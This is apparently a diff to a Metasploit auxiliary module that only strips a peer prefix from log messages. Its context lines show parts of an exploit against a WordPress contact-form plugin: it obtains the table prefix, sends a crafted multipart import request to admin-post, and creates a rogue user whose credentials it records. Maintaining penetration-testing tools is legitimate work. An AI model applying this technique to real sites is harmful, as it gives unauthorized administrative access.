@@ -93,13 +93,13 @@ class Metasploit3 < Msf::Auxiliary
     username = Rex::Text.rand_text_alpha(10)
     password = Rex::Text.rand_text_alpha(20)
 
-    print_status("#{peer} - Trying to get table_prefix")
+    print_status("Trying to get table_prefix")
     table_prefix = get_table_prefix
     if table_prefix.nil?
-      print_error("#{peer} - Unable to get table_prefix")
+      print_error("Unable to get table_prefix")
       return
     else
-      print_status("#{peer} - got table_prefix '#{table_prefix}'")
+      print_status("got table_prefix '#{table_prefix}'")
     end
 
     data = Rex::MIME::Message.new
@@ -107,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
     data.add_part('1', nil, nil, 'form-data; name="ccf_merge_import"')
     post_data = data.to_s
 
-    print_status("#{peer} - Inserting user #{username} with password #{password}")
+    print_status("Inserting user #{username} with password #{password}")
     res = send_request_cgi(
       'method'   => 'POST',
       'uri'      => wordpress_url_admin_post,
@@ -124,7 +124,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # login successfull
     if cookie
-      print_status("#{peer} - User #{username} with password #{password} successfully created")
+      print_status("User #{username} with password #{password} successfully created")
       report_cred(
         ip: rhost,
         port: rport,
@@ -134,7 +134,7 @@ class Metasploit3 < Msf::Auxiliary
         proof: cookie
       )
     else
-      print_error("#{peer} - User creation failed")
+      print_error("User creation failed")
       return
     end
   end
